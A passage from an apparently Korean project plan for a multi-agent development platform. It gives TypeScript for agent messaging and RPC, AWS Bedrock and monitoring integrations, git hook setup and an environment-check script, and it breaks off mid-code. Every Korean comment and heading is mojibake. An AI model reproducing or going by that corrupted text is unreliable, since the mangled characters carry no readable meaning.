  private agents: Map<string, any> = new Map();
  private routingTable: Map<string, string[]> = new Map();
  
  constructor(messageBus: MessageBus) {
    this.messageBus = messageBus;
  }
  
  // ì—ì´ì „íŠ¸ ë“±ë¡
  registerAgent(agentId: string, agent: any, channels: string[]): void {
    this.agents.set(agentId, agent);
    
    channels.forEach(channel => {
      if (!this.routingTable.has(channel)) {
        this.routingTable.set(channel, []);
      }
      this.routingTable.get(channel)!.push(agentId);
      
      // ì±„ë„ êµ¬ë…
      this.messageBus.subscribe(channel, async (message) => {
        if (message.target === agentId || message.target === 'broadcast') {
          const response = await agent.handleMessage(message);
          
          if (response && response.type === 'response') {
            await this.sendMessage(response);
          }
        }
      });
    });
  }
  
  // ë©”ì‹œì§€ ì „ì†¡
  async sendMessage(message: AgentMessage): Promise<void> {
    // Direct ë©”ì‹œì§•
    if (message.target && message.target !== 'broadcast') {
      await this.messageBus.publish(`agent:${message.target}`, message);
      return;
    }
    
    // Broadcast ë©”ì‹œì§•
    if (message.target === 'broadcast') {
      await this.messageBus.publish('agent:broadcast', message);
    }
  }
  
  // ë¼ìš°íŒ… ì •ë³´ ì¡°íšŒ
  getRoutingInfo(): Map<string, string[]> {
    return new Map(this.routingTable);
  }
  
  // ì—ì´ì „íŠ¸ ìƒíƒœ ì¡°íšŒ
  getAgentStatus(agentId: string): any {
    const agent = this.agents.get(agentId);
    return agent ? agent.getStatus() : null;
  }
}

// ì—ì´ì „íŠ¸ ê°„ RPC ì§€ì›
export class AgentRPC {
  private communicationManager: AgentCommunicationManager;
  private pendingCalls: Map<string, {
    resolve: (value: any) => void;
    reject: (error: any) => void;
    timeout: NodeJS.Timeout;
  }> = new Map();
  
  constructor(communicationManager: AgentCommunicationManager) {
    this.communicationManager = communicationManager;
  }
  
  // RPC í˜¸ì¶œ
  async call(
    targetAgent: string,
    method: string,
    params: any,
    timeout: number = 30000
  ): Promise<any> {
    const callId = `rpc-${Date.now()}-${Math.random()}`;
    
    const message: AgentMessage = {
      id: callId,
      type: 'request',
      source: 'rpc-client',
      target: targetAgent,
      payload: {
        method,
        params
      },
      timestamp: new Date()
    };
    
    return new Promise((resolve, reject) => {
      // íƒ€ì„ì•„ì›ƒ ì„¤ì •
      const timeoutHandle = setTimeout(() => {
        this.pendingCalls.delete(callId);
        reject(new Error(`RPC call timeout: ${method}`));
      }, timeout);
      
      // ëŒ€ê¸° ì¤‘ì¸ í˜¸ì¶œ ë“±ë¡
      this.pendingCalls.set(callId, {
        resolve,
        reject,
        timeout: timeoutHandle
      });
      
      // ë©”ì‹œì§€ ì „ì†¡
      this.communicationManager.sendMessage(message);
    });
  }
  
  // RPC ì‘ë‹µ ì²˜ë¦¬
  handleResponse(message: AgentMessage): void {
    if (message.correlationId && this.pendingCalls.has(message.correlationId)) {
      const call = this.pendingCalls.get(message.correlationId)!;
      clearTimeout(call.timeout);
      
      if (message.type === 'response') {
        call.resolve(message.payload);
      } else if (message.type === 'error') {
        call.reject(new Error(message.payload.error));
      }
      
      this.pendingCalls.delete(message.correlationId);
    }
  }
}
```

### SubTask 0.13.3: AWS Bedrock AgentCore í†µí•© ì¤€ë¹„
**ëª©í‘œ**: Bedrock AgentCoreì™€ì˜ í†µí•©ì„ ìœ„í•œ ê¸°ì´ˆ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/integrations/bedrock/agentcore-config.ts
import { 
  BedrockAgentRuntimeClient,
  InvokeAgentCommand,
  RetrieveCommand
} from '@aws-sdk/client-bedrock-agent-runtime';
import { Logger } from 'winston';

export interface AgentCoreConfig {
  agentId: string;
  agentAliasId: string;
  region: string;
  knowledgeBaseId?: string;
  instructionTemplate?: string;
}

export class BedrockAgentCoreManager {
  private client: BedrockAgentRuntimeClient;
  private logger: Logger;
  private config: AgentCoreConfig;
  
  constructor(
    config: AgentCoreConfig,
    logger: Logger
  ) {
    this.config = config;
    this.logger = logger;
    
    this.client = new BedrockAgentRuntimeClient({
      region: config.region
    });
  }
  
  // ì—ì´ì „íŠ¸ í˜¸ì¶œ
  async invokeAgent(
    sessionId: string,
    inputText: string,
    sessionAttributes?: Record<string, string>
  ): Promise<any> {
    try {
      const command = new InvokeAgentCommand({
        agentId: this.config.agentId,
        agentAliasId: this.config.agentAliasId,
        sessionId,
        inputText,
        sessionState: {
          sessionAttributes
        }
      });
      
      const response = await this.client.send(command);
      
      // ìŠ¤íŠ¸ë¦¬ë° ì‘ë‹µ ì²˜ë¦¬
      const chunks: any[] = [];
      
      if (response.completion) {
        for await (const chunk of response.completion) {
          chunks.push(chunk);
          
          // ì²­í¬ íƒ€ì…ë³„ ì²˜ë¦¬
          if (chunk.chunk) {
            this.handleChunk(chunk.chunk);
          }
        }
      }
      
      return {
        sessionId,
        response: chunks,
        metadata: {
          agentId: this.config.agentId,
          timestamp: new Date()
        }
      };
      
    } catch (error) {
      this.logger.error('Bedrock AgentCore invocation failed', {
        error,
        sessionId,
        inputText
      });
      throw error;
    }
  }
  
  // Knowledge Base ê²€ìƒ‰
  async retrieveFromKnowledgeBase(
    query: string,
    numberOfResults: number = 5
  ): Promise<any> {
    if (!this.config.knowledgeBaseId) {
      throw new Error('Knowledge base ID not configured');
    }
    
    try {
      const command = new RetrieveCommand({
        knowledgeBaseId: this.config.knowledgeBaseId,
        retrievalQuery: {
          text: query
        },
        retrievalConfiguration: {
          vectorSearchConfiguration: {
            numberOfResults
          }
        }
      });
      
      const response = await this.client.send(command);
      
      return {
        results: response.retrievalResults || [],
        metadata: {
          knowledgeBaseId: this.config.knowledgeBaseId,
          query,
          timestamp: new Date()
        }
      };
      
    } catch (error) {
      this.logger.error('Knowledge base retrieval failed', {
        error,
        query,
        knowledgeBaseId: this.config.knowledgeBaseId
      });
      throw error;
    }
  }
  
  // ì²­í¬ ì²˜ë¦¬
  private handleChunk(chunk: any): void {
    if (chunk.bytes) {
      // ë°”ì´ë„ˆë¦¬ ë°ì´í„° ì²˜ë¦¬
      const text = Buffer.from(chunk.bytes).toString('utf-8');
      this.logger.debug('Received text chunk', { text });
    }
    
    if (chunk.attribution) {
      // ì†ì„± ì •ë³´ ì²˜ë¦¬
      this.logger.debug('Received attribution', {
        attribution: chunk.attribution
      });
    }
  }
  
  // ì„¸ì…˜ ê´€ë¦¬
  async createSession(userId: string, metadata?: any): Promise<string> {
    const sessionId = `${userId}-${Date.now()}`;
    
    this.logger.info('Created Bedrock session', {
      sessionId,
      userId,
      metadata
    });
    
    return sessionId;
  }
}

// Bedrock ì—ì´ì „íŠ¸ ë˜í¼
export abstract class BedrockAgent extends BaseAgent {
  protected bedrockManager: BedrockAgentCoreManager;
  
  constructor(
    name: string,
    version: string,
    logger: Logger,
    bedrockConfig: AgentCoreConfig
  ) {
    super(name, version, logger);
    
    this.bedrockManager = new BedrockAgentCoreManager(
      bedrockConfig,
      logger
    );
  }
  
  // Bedrock ê¸°ëŠ¥ì„ í™œìš©í•œ ì²˜ë¦¬
  protected async processWithBedrock(
    input: string,
    sessionId?: string
  ): Promise<any> {
    const session = sessionId || await this.bedrockManager.createSession(
      this.context?.userId || 'anonymous'
    );
    
    return this.bedrockManager.invokeAgent(session, input);
  }
  
  // Knowledge Base í™œìš©
  protected async searchKnowledgeBase(query: string): Promise<any> {
    return this.bedrockManager.retrieveFromKnowledgeBase(query);
  }
}
```

### SubTask 0.13.4: Agent Squad í†µí•© ì¤€ë¹„
**ëª©í‘œ**: AWS Agent Squadì™€ì˜ í†µí•©ì„ ìœ„í•œ ê¸°ì´ˆ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/integrations/agent-squad/squad-config.ts
import { EventEmitter } from 'events';
import { Logger } from 'winston';

export interface SquadConfig {
  supervisorConfig: {
    name: string;
    role: 'orchestrator' | 'coordinator' | 'monitor';
    capabilities: string[];
  };
  workers: Array<{
    name: string;
    type: string;
    count: number;
    capabilities: string[];
  }>;
  communication: {
    protocol: 'redis' | 'sqs' | 'eventbridge';
    endpoint: string;
  };
}

// Supervisor Agent êµ¬í˜„
export class SupervisorAgent extends EventEmitter {
  private config: SquadConfig['supervisorConfig'];
  private logger: Logger;
  private workers: Map<string, WorkerAgent[]> = new Map();
  private taskQueue: TaskQueue;
  
  constructor(
    config: SquadConfig['supervisorConfig'],
    logger: Logger
  ) {
    super();
    this.config = config;
    this.logger = logger;
    this.taskQueue = new TaskQueue();
    
    this.initialize();
  }
  
  private initialize(): void {
    this.logger.info('Supervisor Agent initialized', {
      name: this.config.name,
      role: this.config.role,
      capabilities: this.config.capabilities
    });
  }
  
  // Worker ê´€ë¦¬
  async addWorker(worker: WorkerAgent): Promise<void> {
    const type = worker.getType();
    
    if (!this.workers.has(type)) {
      this.workers.set(type, []);
    }
    
    this.workers.get(type)!.push(worker);
    
    this.logger.info('Worker added to squad', {
      supervisorName: this.config.name,
      workerType: type,
      workerId: worker.getId()
    });
    
    // Worker ì´ë²¤íŠ¸ êµ¬ë…
    worker.on('taskCompleted', (result) => {
      this.handleWorkerTaskCompletion(worker, result);
    });
    
    worker.on('error', (error) => {
      this.handleWorkerError(worker, error);
    });
  }
  
  // ì‘ì—… ë¶„ë°°
  async distributeTask(task: Task): Promise<void> {
    const workerType = this.selectWorkerType(task);
    const workers = this.workers.get(workerType);
    
    if (!workers || workers.length === 0) {
      throw new Error(`No workers available for type: ${workerType}`);
    }
    
    // ë¡œë“œ ë°¸ëŸ°ì‹±: ê°€ì¥ idleí•œ worker ì„ íƒ
    const selectedWorker = this.selectIdleWorker(workers);
    
    if (!selectedWorker) {
      // ëª¨ë“  workerê°€ busyí•˜ë©´ íì— ì¶”ê°€
      await this.taskQueue.enqueue(task);
      return;
    }
    
    await selectedWorker.executeTask(task);
  }
  
  // Worker ì„ íƒ ë¡œì§
  private selectWorkerType(task: Task): string {
    // ì‘ì—… íƒ€ì…ê³¼ capability ë§¤ì¹­
    for (const [type, workers] of this.workers) {
      if (workers.some(w => w.canHandle(task))) {
        return type;
      }
    }
    
    throw new Error(`No suitable worker for task: ${task.type}`);
  }
  
  private selectIdleWorker(workers: WorkerAgent[]): WorkerAgent | null {
    return workers.find(w => w.getStatus() === 'idle') || null;
  }
  
  // ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬
  private handleWorkerTaskCompletion(
    worker: WorkerAgent,
    result: any
  ): void {
    this.logger.info('Worker task completed', {
      workerId: worker.getId(),
      result
    });
    
    this.emit('taskCompleted', {
      worker: worker.getId(),
      result
    });
    
    // íì—ì„œ ë‹¤ìŒ ì‘ì—… í• ë‹¹
    this.assignNextTask(worker);
  }
  
  private handleWorkerError(
    worker: WorkerAgent,
    error: Error
  ): void {
    this.logger.error('Worker error', {
      workerId: worker.getId(),
      error
    });
    
    this.emit('workerError', {
      worker: worker.getId(),
      error
    });
  }
  
  private async assignNextTask(worker: WorkerAgent): Promise<void> {
    const nextTask = await this.taskQueue.dequeue(worker.getType());
    
    if (nextTask) {
      await worker.executeTask(nextTask);
    }
  }
  
  // ìƒíƒœ ëª¨ë‹ˆí„°ë§
  getSquadStatus(): any {
    const status = {
      supervisor: {
        name: this.config.name,
        role: this.config.role
      },
      workers: {} as any,
      queueSize: this.taskQueue.size()
    };
    
    for (const [type, workers] of this.workers) {
      status.workers[type] = {
        count: workers.length,
        idle: workers.filter(w => w.getStatus() === 'idle').length,
        busy: workers.filter(w => w.getStatus() === 'busy').length
      };
    }
    
    return status;
  }
}

// Worker Agent ê¸°ë³¸ í´ë˜ìŠ¤
export abstract class WorkerAgent extends EventEmitter {
  protected id: string;
  protected type: string;
  protected status: 'idle' | 'busy' | 'error' = 'idle';
  protected capabilities: string[];
  protected logger: Logger;
  
  constructor(
    type: string,
    capabilities: string[],
    logger: Logger
  ) {
    super();
    this.id = `worker-${type}-${Date.now()}`;
    this.type = type;
    this.capabilities = capabilities;
    this.logger = logger;
  }
  
  getId(): string {
    return this.id;
  }
  
  getType(): string {
    return this.type;
  }
  
  getStatus(): string {
    return this.status;
  }
  
  canHandle(task: Task): boolean {
    return this.capabilities.includes(task.capability);
  }
  
  async executeTask(task: Task): Promise<void> {
    this.status = 'busy';
    
    try {
      const result = await this.process(task);
      
      this.emit('taskCompleted', result);
      this.status = 'idle';
      
    } catch (error) {
      this.status = 'error';
      this.emit('error', error);
      
      setTimeout(() => {
        this.status = 'idle';
      }, 5000); // 5ì´ˆ í›„ ë³µêµ¬
    }
  }
  
  protected abstract process(task: Task): Promise<any>;
}

// ì‘ì—… í êµ¬í˜„
class TaskQueue {
  private queues: Map<string, Task[]> = new Map();
  
  async enqueue(task: Task): Promise<void> {
    const type = task.workerType || 'default';
    
    if (!this.queues.has(type)) {
      this.queues.set(type, []);
    }
    
    this.queues.get(type)!.push(task);
  }
  
  async dequeue(type: string): Promise<Task | null> {
    const queue = this.queues.get(type);
    
    if (!queue || queue.length === 0) {
      return null;
    }
    
    return queue.shift() || null;
  }
  
  size(): number {
    let total = 0;
    for (const queue of this.queues.values()) {
      total += queue.length;
    }
    return total;
  }
}

// íƒ€ì… ì •ì˜
interface Task {
  id: string;
  type: string;
  capability: string;
  workerType?: string;
  payload: any;
  priority?: number;
  timeout?: number;
}
```

### SubTask 0.13.5: Agno ëª¨ë‹ˆí„°ë§ í†µí•© ì¤€ë¹„
**ëª©í‘œ**: Agno í”Œë«í¼ê³¼ì˜ ëª¨ë‹ˆí„°ë§ í†µí•© ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/integrations/agno/monitoring-config.ts
import axios, { AxiosInstance } from 'axios';
import { Logger } from 'winston';

export interface AgnoConfig {
  apiKey: string;
  endpoint: string;
  projectId: string;
  environment: string;
  batchSize?: number;
  flushInterval?: number;
}

export interface AgnoMetric {
  name: string;
  value: number;
  tags?: Record<string, string>;
  timestamp?: Date;
}

export interface AgnoEvent {
  type: string;
  data: any;
  userId?: string;
  sessionId?: string;
  timestamp?: Date;
  metadata?: Record<string, any>;
}

export interface AgnoTrace {
  traceId: string;
  spanId: string;
  parentSpanId?: string;
  operation: string;
  startTime: Date;
  endTime?: Date;
  duration?: number;
  status: 'success' | 'error';
  metadata?: Record<string, any>;
}

export class AgnoMonitoringClient {
  private config: AgnoConfig;
  private client: AxiosInstance;
  private logger: Logger;
  private metricBuffer: AgnoMetric[] = [];
  private eventBuffer: AgnoEvent[] = [];
  private traceBuffer: AgnoTrace[] = [];
  private flushTimer?: NodeJS.Timer;
  
  constructor(config: AgnoConfig, logger: Logger) {
    this.config = {
      batchSize: 100,
      flushInterval: 10000, // 10ì´ˆ
      ...config
    };
    this.logger = logger;
    
    this.client = axios.create({
      baseURL: config.endpoint,
      headers: {
        'Authorization': `Bearer ${config.apiKey}`,
        'Content-Type': 'application/json',
        'X-Project-ID': config.projectId,
        'X-Environment': config.environment
      }
    });
    
    this.startFlushTimer();
  }
  
  // ë©”íŠ¸ë¦­ ì „ì†¡
  async sendMetric(metric: AgnoMetric): Promise<void> {
    this.metricBuffer.push({
      ...metric,
      timestamp: metric.timestamp || new Date()
    });
    
    if (this.metricBuffer.length >= this.config.batchSize!) {
      await this.flushMetrics();
    }
  }
  
  // ì´ë²¤íŠ¸ ì „ì†¡
  async sendEvent(event: AgnoEvent): Promise<void> {
    this.eventBuffer.push({
      ...event,
      timestamp: event.timestamp || new Date()
    });
    
    if (this.eventBuffer.length >= this.config.batchSize!) {
      await this.flushEvents();
    }
  }
  
  // íŠ¸ë ˆì´ìŠ¤ ì „ì†¡
  async sendTrace(trace: AgnoTrace): Promise<void> {
    this.traceBuffer.push(trace);
    
    if (this.traceBuffer.length >= this.config.batchSize!) {
      await this.flushTraces();
    }
  }
  
  // ì—ì´ì „íŠ¸ ì„±ëŠ¥ ëª¨ë‹ˆí„°ë§
  async monitorAgentPerformance(
    agentName: string,
    operation: string,
    duration: number,
    success: boolean,
    metadata?: any
  ): Promise<void> {
    // ë©”íŠ¸ë¦­ ì „ì†¡
    await this.sendMetric({
      name: `agent.${agentName}.duration`,
      value: duration,
      tags: {
        agent: agentName,
        operation,
        status: success ? 'success' : 'failure'
      }
    });
    
    // ì´ë²¤íŠ¸ ì „ì†¡
    await this.sendEvent({
      type: 'agent_operation',
      data: {
        agent: agentName,
        operation,
        duration,
        success,
        ...metadata
      }
    });
  }
  
  // í”„ë¡œì íŠ¸ ì§„í–‰ìƒí™© ëª¨ë‹ˆí„°ë§
  async monitorProjectProgress(
    projectId: string,
    phase: string,
    progress: number,
    metadata?: any
  ): Promise<void> {
    await this.sendEvent({
      type: 'project_progress',
      data: {
        projectId,
        phase,
        progress,
        ...metadata
      }
    });
    
    await this.sendMetric({
      name: 'project.progress',
      value: progress,
      tags: {
        project: projectId,
        phase
      }
    });
  }
  
  // ì—ëŸ¬ ì¶”ì 
  async trackError(
    error: Error,
    context: {
      agent?: string;
      operation?: string;
      userId?: string;
      projectId?: string;
    }
  ): Promise<void> {
    await this.sendEvent({
      type: 'error',
      data: {
        message: error.message,
        stack: error.stack,
        name: error.name,
        ...context
      },
      userId: context.userId
    });
  }
  
  // ë°°ì¹˜ ì „ì†¡ ë©”ì„œë“œë“¤
  private async flushMetrics(): Promise<void> {
    if (this.metricBuffer.length === 0) return;
    
    const metrics = [...this.metricBuffer];
    this.metricBuffer = [];
    
    try {
      await this.client.post('/metrics', { metrics });
      this.logger.debug(`Flushed ${metrics.length} metrics to Agno`);
    } catch (error) {
      this.logger.error('Failed to flush metrics to Agno', { error });
      // ì‹¤íŒ¨í•œ ë©”íŠ¸ë¦­ì€ ë²„í¼ì— ë‹¤ì‹œ ì¶”ê°€
      this.metricBuffer.unshift(...metrics);
    }
  }
  
  private async flushEvents(): Promise<void> {
    if (this.eventBuffer.length === 0) return;
    
    const events = [...this.eventBuffer];
    this.eventBuffer = [];
    
    try {
      await this.client.post('/events', { events });
      this.logger.debug(`Flushed ${events.length} events to Agno`);
    } catch (error) {
      this.logger.error('Failed to flush events to Agno', { error });
      this.eventBuffer.unshift(...events);
    }
  }
  
  private async flushTraces(): Promise<void> {
    if (this.traceBuffer.length === 0) return;
    
    const traces = [...this.traceBuffer];
    this.traceBuffer = [];
    
    try {
      await this.client.post('/traces', { traces });
      this.logger.debug(`Flushed ${traces.length} traces to Agno`);
    } catch (error) {
      this.logger.error('Failed to flush traces to Agno', { error });
      this.traceBuffer.unshift(...traces);
    }
  }
  
  // íƒ€ì´ë¨¸ ê´€ë¦¬
  private startFlushTimer(): void {
    this.flushTimer = setInterval(async () => {
      await Promise.all([
        this.flushMetrics(),
        this.flushEvents(),
        this.flushTraces()
      ]);
    }, this.config.flushInterval!);
  }
  
  async shutdown(): Promise<void> {
    if (this.flushTimer) {
      clearInterval(this.flushTimer);
    }
    
    // ë‚¨ì€ ë°ì´í„° ëª¨ë‘ ì „ì†¡
    await Promise.all([
      this.flushMetrics(),
      this.flushEvents(),
      this.flushTraces()
    ]);
  }
}

// Agno ë°ì½”ë ˆì´í„° (ë©”ì„œë“œ ìë™ ì¶”ì )
export function AgnoTrace(
  operationName?: string
): MethodDecorator {
  return function (
    target: any,
    propertyKey: string | symbol,
    descriptor: PropertyDescriptor
  ) {
    const originalMethod = descriptor.value;
    
    descriptor.value = async function (...args: any[]) {
      const operation = operationName || String(propertyKey);
      const traceId = `trace-${Date.now()}-${Math.random()}`;
      const spanId = `span-${Date.now()}-${Math.random()}`;
      const startTime = Date.now();
      
      const agnoClient = (this as any).agnoClient;
      
      try {
        const result = await originalMethod.apply(this, args);
        
        if (agnoClient) {
          await agnoClient.sendTrace({
            traceId,
            spanId,
            operation,
            startTime: new Date(startTime),
            endTime: new Date(),
            duration: Date.now() - startTime,
            status: 'success',
            metadata: {
              class: target.constructor.name,
              method: String(propertyKey)
            }
          });
        }
        
        return result;
        
      } catch (error) {
        if (agnoClient) {
          await agnoClient.sendTrace({
            traceId,
            spanId,
            operation,
            startTime: new Date(startTime),
            endTime: new Date(),
            duration: Date.now() - startTime,
            status: 'error',
            metadata: {
              class: target.constructor.name,
              method: String(propertyKey),
              error: error.message
            }
          });
        }
        
        throw error;
      }
    };
    
    return descriptor;
  };
}
```

---

## Task 0.14: ê°œë°œ ì›Œí¬í”Œë¡œìš° ìë™í™”

### SubTask 0.14.1: Git í›… ë° ì»¤ë°‹ ê·œì¹™ ì„¤ì •
**ëª©í‘œ**: ì¼ê´€ëœ ì½”ë“œ í’ˆì§ˆì„ ìœ„í•œ Git í›… ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```bash
#!/bin/bash
# scripts/setup-git-hooks.sh

echo "ğŸ”§ Git í›… ì„¤ì • ì‹œì‘..."

# Husky ì„¤ì¹˜ ë° ì´ˆê¸°í™”
npm install --save-dev husky
npx husky install

# commit-msg í›… ì¶”ê°€
npx husky add .husky/commit-msg 'npx --no -- commitlint --edit $1'

# pre-commit í›… ì¶”ê°€
npx husky add .husky/pre-commit 'npm run pre-commit'

# pre-push í›… ì¶”ê°€
npx husky add .husky/pre-push 'npm run pre-push'

echo "âœ… Git í›… ì„¤ì • ì™„ë£Œ!"
```

```typescript
// commitlint.config.js
module.exports = {
  extends: ['@commitlint/config-conventional'],
  rules: {
    'type-enum': [
      2,
      'always',
      [
        'feat',     // ìƒˆë¡œìš´ ê¸°ëŠ¥
        'fix',      // ë²„ê·¸ ìˆ˜ì •
        'docs',     // ë¬¸ì„œ ìˆ˜ì •
        'style',    // ì½”ë“œ í¬ë§·íŒ…
        'refactor', // ì½”ë“œ ë¦¬íŒ©í† ë§
        'test',     // í…ŒìŠ¤íŠ¸ ì¶”ê°€/ìˆ˜ì •
        'chore',    // ë¹Œë“œ í”„ë¡œì„¸ìŠ¤ ë˜ëŠ” ë³´ì¡° ë„êµ¬ ë³€ê²½
        'perf',     // ì„±ëŠ¥ ê°œì„ 
        'ci',       // CI ì„¤ì • ë³€ê²½
        'revert',   // ì´ì „ ì»¤ë°‹ ë˜ëŒë¦¬ê¸°
        'agent'     // ì—ì´ì „íŠ¸ ê´€ë ¨ ë³€ê²½ (T-Developer ì „ìš©)
      ]
    ],
    'subject-case': [2, 'never', ['upper-case']],
    'header-max-length': [2, 'always', 72],
    'body-max-line-length': [2, 'always', 100],
    'scope-enum': [
      2,
      'always',
      [
        'core',
        'agents',
        'api',
        'frontend',
        'infra',
        'docs',
        'tests',
        'deps'
      ]
    ]
  }
};
```

```json
// .gitmessage
# <type>(<scope>): <subject>
#
# <body>
#
# <footer>
#
# Type: feat, fix, docs, style, refactor, test, chore, perf, ci, revert, agent
# Scope: core, agents, api, frontend, infra, docs, tests, deps
#
# Subject: ì²« ê¸€ì ì†Œë¬¸ì, ëª…ë ¹í˜•, ë§ˆì¹¨í‘œ ì—†ìŒ, 50ì ì´ë‚´
#
# Body: 72ìë§ˆë‹¤ ì¤„ë°”ê¿ˆ, ë¬´ì—‡ì„ ì™œ í–ˆëŠ”ì§€ ì„¤ëª…
#
# Footer: Breaking changes, ì´ìŠˆ ë²ˆí˜¸ ì°¸ì¡°
#
# ì˜ˆì‹œ:
# feat(agents): add natural language input processing
#
# Implement NL input agent with following capabilities:
# - Parse user requirements from natural language
# - Extract technical specifications
# - Generate structured project metadata
#
# Closes #123
```
### SubTask 0.14.2: ê°œë°œ í™˜ê²½ ìµœì¢… ê²€ì¦
**ëª©í‘œ**: ëª¨ë“  ê°œë°œ í™˜ê²½ êµ¬ì„±ìš”ì†Œì˜ ì •ìƒ ì‘ë™ í™•ì¸

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// scripts/verify-environment.ts
import { exec } from 'child_process';
import { promisify } from 'util';
import fs from 'fs/promises';
import axios from 'axios';
import { DynamoDBClient, ListTablesCommand } from '@aws-sdk/client-dynamodb';
import Redis from 'ioredis';
import chalk from 'chalk';

const execAsync = promisify(exec);

interface VerificationResult {
  component: string;
  status: 'pass' | 'fail' | 'warning';
  message: string;
  details?: any;
}

class EnvironmentVerifier {
  private results: VerificationResult[] = [];
  
  async verify(): Promise<void> {
    console.log(chalk.blue('ğŸ” T-Developer í™˜ê²½ ê²€ì¦ ì‹œì‘...\n'));
    
    // 1. Node.js í™˜ê²½
    await this.verifyNodeEnvironment();
    
    // 2. AWS ì„¤ì •
    await this.verifyAWSConfiguration();
    
    // 3. ë°ì´í„°ë² ì´ìŠ¤
    await this.verifyDatabases();
    
    // 4. ì™¸ë¶€ ì„œë¹„ìŠ¤
    await this.verifyExternalServices();
    
    // 5. ê°œë°œ ë„êµ¬
    await this.verifyDevelopmentTools();
    
    // 6. ë³´ì•ˆ ì„¤ì •
    await this.verifySecuritySettings();
    
    // ê²°ê³¼ ì¶œë ¥
    this.printResults();
  }
  
  private async verifyNodeEnvironment(): Promise<void> {
    try {
      const { stdout: nodeVersion } = await execAsync('node --version');
      const { stdout: npmVersion } = await execAsync('npm --version');
      
      const nodeMatch = nodeVersion.match(/v(\d+)\.(\d+)/);
      if (nodeMatch) {
        const majorVersion = parseInt(nodeMatch[1]);
        if (majorVersion >= 18) {
          this.addResult('Node.js', 'pass', `ë²„ì „ ${nodeVersion.trim()} í™•ì¸`);
        } else {
          this.addResult('Node.js', 'fail', `ë²„ì „ 18 ì´ìƒ í•„ìš” (í˜„ì¬: ${nodeVersion.trim()})`);
        }
      }
      
      this.addResult('npm', 'pass', `ë²„ì „ ${npmVersion.trim()} í™•ì¸`);
      
      // í•„ìˆ˜ íŒ¨í‚¤ì§€ í™•ì¸
      const packageJson = JSON.parse(await fs.readFile('package.json', 'utf-8'));
      const requiredPackages = [
        '@aws-sdk/client-bedrock-runtime',
        '@aws-sdk/client-dynamodb',
        'express',
        'typescript',
        'jest'
      ];
      
      const missingPackages = requiredPackages.filter(
        pkg => !packageJson.dependencies?.[pkg] && !packageJson.devDependencies?.[pkg]
      );
      
      if (missingPackages.length === 0) {
        this.addResult('í•„ìˆ˜ íŒ¨í‚¤ì§€', 'pass', 'ëª¨ë“  í•„ìˆ˜ íŒ¨í‚¤ì§€ ì„¤ì¹˜ë¨');
      } else {
        this.addResult('í•„ìˆ˜ íŒ¨í‚¤ì§€', 'fail', `ëˆ„ë½ëœ íŒ¨í‚¤ì§€: ${missingPackages.join(', ')}`);
      }
      
    } catch (error) {
      this.addResult('Node.js í™˜ê²½', 'fail', 'í™•ì¸ ì‹¤íŒ¨', error);
    }
  }
  
  private async verifyAWSConfiguration(): Promise<void> {
    try {
      // AWS ìê²© ì¦ëª… í™•ì¸
      const { stdout: awsIdentity } = await execAsync('aws sts get-caller-identity');
      const identity = JSON.parse(awsIdentity);
      
      this.addResult('AWS ìê²© ì¦ëª…', 'pass', `ê³„ì • ID: ${identity.Account}`);
      
      // DynamoDB ì—°ê²° í…ŒìŠ¤íŠ¸
      const dynamoClient = new DynamoDBClient({
        region: process.env.AWS_REGION || 'us-east-1',
        endpoint: process.env.DYNAMODB_ENDPOINT
      });
      
      const tables = await dynamoClient.send(new ListTablesCommand({}));
      this.addResult('DynamoDB', 'pass', `í…Œì´ë¸” ìˆ˜: ${tables.TableNames?.length || 0}`);
      
      // S3 ë²„í‚· í™•ì¸
      const { stdout: s3Buckets } = await execAsync('aws s3 ls');
      const bucketCount = s3Buckets.split('\n').filter(line => line.trim()).length;
      this.addResult('S3', 'pass', `ë²„í‚· ìˆ˜: ${bucketCount}`);
      
    } catch (error) {
      this.addResult('AWS ì„¤ì •', 'fail', 'AWS ì„œë¹„ìŠ¤ ì—°ê²° ì‹¤íŒ¨', error);
    }
  }
  
  private async verifyDatabases(): Promise<void> {
    // Redis ì—°ê²° í…ŒìŠ¤íŠ¸
    try {
      const redis = new Redis({
        host: process.env.REDIS_HOST || 'localhost',
        port: parseInt(process.env.REDIS_PORT || '6379'),
        retryStrategy: () => null
      });
      
      await redis.ping();
      this.addResult('Redis', 'pass', 'Redis ì„œë²„ ì—°ê²° ì„±ê³µ');
      await redis.disconnect();
      
    } catch (error) {
      this.addResult('Redis', 'warning', 'Redis ì„œë²„ ì—°ê²° ì‹¤íŒ¨ (ì„ íƒì‚¬í•­)');
    }
    
    // DynamoDB Local í™•ì¸
    if (process.env.NODE_ENV === 'development') {
      try {
        const response = await axios.get('http://localhost:8000');
        this.addResult('DynamoDB Local', 'pass', 'ë¡œì»¬ DynamoDB ì‹¤í–‰ ì¤‘');
      } catch {
        this.addResult('DynamoDB Local', 'warning', 'ë¡œì»¬ DynamoDB ë¯¸ì‹¤í–‰ (ê°œë°œìš©)');
      }
    }
  }
  
  private async verifyExternalServices(): Promise<void> {
    // GitHub API
    if (process.env.GITHUB_TOKEN) {
      try {
        await axios.get('https://api.github.com/user', {
          headers: { Authorization: `token ${process.env.GITHUB_TOKEN}` }
        });
        this.addResult('GitHub API', 'pass', 'GitHub í† í° ìœ íš¨');
      } catch {
        this.addResult('GitHub API', 'fail', 'GitHub í† í° ë¬´íš¨');
      }
    } else {
      this.addResult('GitHub API', 'warning', 'GitHub í† í° ë¯¸ì„¤ì •');
    }
    
    // AI ì„œë¹„ìŠ¤
    const aiServices = [
      { name: 'OpenAI', envVar: 'OPENAI_API_KEY' },
      { name: 'Anthropic', envVar: 'ANTHROPIC_API_KEY' },
      { name: 'Bedrock', envVar: 'BEDROCK_AGENTCORE_RUNTIME_ID' }
    ];
    
    for (const service of aiServices) {
      if (process.env[service.envVar]) {
        this.addResult(service.name, 'pass', `${service.envVar} ì„¤ì •ë¨`);
      } else {
        this.addResult(service.name, 'warning', `${service.envVar} ë¯¸ì„¤ì •`);
      }
    }
  }
  
  private async verifyDevelopmentTools(): Promise<void> {
    const tools = [
      { cmd: 'docker --version', name: 'Docker' },
      { cmd: 'git --version', name: 'Git' },
      { cmd: 'code --version', name: 'VS Code', optional: true }
    ];
    
    for (const tool of tools) {
      try {
        const { stdout } = await execAsync(tool.cmd);
